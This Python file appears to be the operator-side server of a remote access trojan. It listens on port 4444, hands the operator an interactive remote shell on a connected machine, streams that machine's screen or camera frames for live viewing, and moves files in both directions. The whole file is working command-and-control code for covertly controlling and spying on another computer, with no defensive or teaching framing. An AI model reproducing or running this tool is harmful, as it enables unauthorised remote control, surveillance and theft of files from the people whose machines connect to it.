import socket
import os 
import time
import cv2
import pickle
import struct

HOST = '127.0.0.1'
PORT = 4444        # Port to listen on (non-privileged ports are > 1023)


def VideoShare():
    payload_size = struct.calcsize("Q")
    data = b''
    while True:
        while len(data) < payload_size:
            packet = client_socket.recv(4 * 1024)  # Отримання пакету
            if not packet:
                break
            data += packet

        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]

        if(data.decode() == [200]):
            break
        while len(data) < msg_size:
            data += client_socket.recv(4 * 1024)

        frame_data = data[:msg_size]
        data = data[msg_size:]

        frame = pickle.loads(frame_data)  # Десеріалізація кадру

        cv2.imshow('Video Stream', frame)  # Відображення кадру

        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    cv2.destroyAllWindows()

def download_file(filename):

    f = open(filename, 'wb')
    client_socket.settimeout(25)
    
    
    chunk = client_socket.recv(1024)

    while chunk:
        try:
            f.write(chunk)
        except:
            f.write(chunk.encode())
        try:
            chunk = client_socket.recv(1024)
        except:
            break
    client_socket.settimeout(None)
    f.close()

def upload_file(filename):
    time.sleep(3)
    
    f = open(filename, "rb")
    client_socket.settimeout(25)
    while True:
        file_data = f.read(1024)
        if (not file_data):
            break
        client_socket.send(file_data) 
    f.close()
    client_socket.settimeout(None)
    client_socket.recv(1024)
    print("[*] Command succsesful ended")
   

def inputCommand():
    while(True):
        output = input('* Shell~%s:  ' % str(client_addres[0]))
        if(output == 'clear' or output == 'cls'):
            os.system('cls')
            output = ""
        elif(output[:11] == 'screenshare'):
            VideoShare()
        elif(output[:8] == 'download'):
            client_socket.send(output.encode())
            download_file(output[9:])
        elif(output[:6] == 'upload'):
            client_socket.send(output.encode())
            upload_file(output[7:])
            output = ""

        elif (output.replace(" ", "") != ""):
            return output

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.bind((HOST,PORT))
print("[*] Starting listen port " + str(PORT))
connection.listen(5)
client_socket, client_addres = connection.accept()

print("[+] Sucsessful connect by " + str(client_addres[0]))

while True:
    message = " "
    output = "" 
    
    output = inputCommand()

    
    client_socket.sendall(output.encode())

    while True:
        
        message += client_socket.recv(1024).decode()
        if("[200]" in message):
            break

    print(message.replace('[200]', ''))
    if("[-]" in message):
        connection.close()
        input()
        break
